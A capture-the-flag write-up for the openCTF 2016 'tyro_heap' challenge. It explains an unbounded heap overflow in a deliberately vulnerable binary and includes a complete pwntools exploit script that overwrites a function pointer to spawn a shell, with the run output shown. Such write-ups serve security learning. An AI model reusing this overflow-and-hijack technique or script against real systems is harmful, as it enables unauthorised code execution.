---
layout: post
title: openCTF 2016 - tyro_heap
category: [Exploitation]
tags: [Exploitation, openCTF]
comments: true
---

**Points:** 50
**Solves:** 
**Category:** Exploitation
**Description:** 

> [tyro_heap]({{site.url}}/assets/tyro_heap_29d1e9341f35f395475bf16aa988e29b)

# Menu

On start the menu provides us with a couple of options.

{% highlight text %}
➜  openCTF ./tyro_heap_29d1e9341f35f395475bf16aa988e29b
Tyro Heap
Sun Aug 14 12:34:18 UTC 2016
c) create heap object
a) read type a into object
b) read type b into object
f) free object
e) run object function
q) quit
::>
{% endhighlight %}

To exploit this we only need to know about `c) create heap object', 'a) read type a into object', 'b) read type b into object' and 'e) run object function'.

## Create heap object

It constructs a class with a single method and a char buffer on the heap.

{% highlight C %}
int create_item() {
    object = malloc(0x24);
    *object = 0x80484e0;    // puts@GOT
    return object;
}
{% endhighlight %}

The class has the following structure.

{% highlight text %}
struct object_class {
    int method = puts@got;
    char data[32];
};
{% endhighlight %}

## Read type a/b into object

Read a reads 35 bytes input via scanf and stores them into object->data.

{% highlight C %}
int read_a(int *object->data) {
    printf("give me input_a: ");
    return __isoc99_scanf("%35s", object);
}
{% endhighlight %}

Read b however, does the same thing as read_a but using `getchar` in a do while loop with no bound checking.

{% highlight C %}
int read_b(int *object->data) {
    counter = 0x0;
    printf("give me input_b: ");
    getchar();
    do {
            char_input = getchar();
            if (char_input == "\n") {
                break;
            }
            if (char_input == -1) {
                break;
            }
            counter = counter + 0x1;
            object->data[counter] = char_input;
    } while (true);
    object->data[counter] = 0x0;
    eax = printf("got [%s]\n", object);
    return eax;
}
{% endhighlight %}

Run object option from the main menu executes a method in a provided class id.

{% highlight C %}
int get_choice(int object_counter) {
    printf("object id ?: ");
    __isoc99_scanf("%d", object_id);
    if ((object_id >= 0x0) && (object_id <= object_counter)) {
            eax = object_id;
    }
    else {
            eax = exit(-1);
    }
    return eax;
}

class_id = get_choice();    // return chosen class id
call class_id.method(data); // call the only method in the class

{% endhighlight %}

# Solution

Since it's a 50 pts task, the organizers have provided us with a win function.

{% highlight C %}
void win() {
    system("/bin/sh");
}
{% endhighlight %}

So, what we need to do is. Allocate 2 classes and overflow class 0->data into class 1->method with the address of `win()` and then call class 1's method.

{% highlight python %}
#!/usr/bin/env python

from pwn import *
import sys

win = p32(0x08048660)

def create_obj():
    r.sendline('c')
    r.recvuntil("::> ")

def read_b(i, data):
    r.sendline('b')
    r.recvuntil('object id ?:')
    r.sendline(str(i))
    r.recvuntil('give me input_b: ')
    r.sendline(data)
    r.recvuntil("::> ")

def exe_id(i):
    r.sendline('e')
    r.recvuntil('object id ?: ')
    r.sendline(str(i))

def exploit(r):
    r.recvuntil('::> ')
    create_obj()
    create_obj()

    payload = win * 10
    read_b(0, payload)

    exe_id(1)
    r.interactive()


if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['/vagrant/openCTF/tyro_heap_29d1e9341f35f395475bf16aa988e29b'])
        print util.proc.pidof(r)
        pause()
        exploit(r)
{% endhighlight %}

{% highlight text %}
➜  openCTF python ./tyro_heap.py
[*] For remote: ./tyro_heap.py HOST PORT
[+] Starting program '/vagrant/openCTF/tyro_heap_29d1e9341f35f395475bf16aa988e29b': Done
[7380]
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
$
{% endhighlight %}

